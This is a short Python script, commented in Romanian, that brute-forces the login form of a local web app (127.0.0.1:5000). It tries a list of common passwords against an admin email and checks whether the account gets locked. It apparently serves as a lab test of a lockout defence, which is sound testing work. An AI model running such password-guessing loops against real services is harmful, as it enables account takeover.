import requests

# Adresa paginii de login din aplicatia noastra
URL = "http://127.0.0.1:5000/login"

# Email-ul tinta pentru test
target_email = "admin@authx.com" 

# Lista de parole comune pentru test
passwords = ["123456", "password", "admin123", "secret", "johnny", "boss123"]

print(f"--- Incepem atacul Brute Force pe: {target_email} ---")

for pwd in passwords:
    # Pregatim datele pentru formularul de login
    data = {
        "email": target_email,
        "password": pwd
    }
    
    # Trimitem cererea catre server
    response = requests.post(URL, data=data)
    
    # Verificam daca am reusit sa intram (cautam un cuvant cheie din dashboard)
    if "Tichet" in response.text or "Sesiune" in response.text:
        print(f"[!] SUCCES! Parola gasita este: {pwd}")
        break
        
    # Verificam daca am fost blocati de sistemul de securitate
    elif "suspendat" in response.text or "blocat" in response.text:
        print(f"[X] ATENTIE: Contul a fost blocat! Serverul zice: {response.text.strip()}")
        break
        
    # Daca nu e succes si nu e blocat, inseamna ca parola a fost gresita
    else:
        print(f"[-] Incercare esuata pentru parola: {pwd}")

print("--- Atac finalizat ---")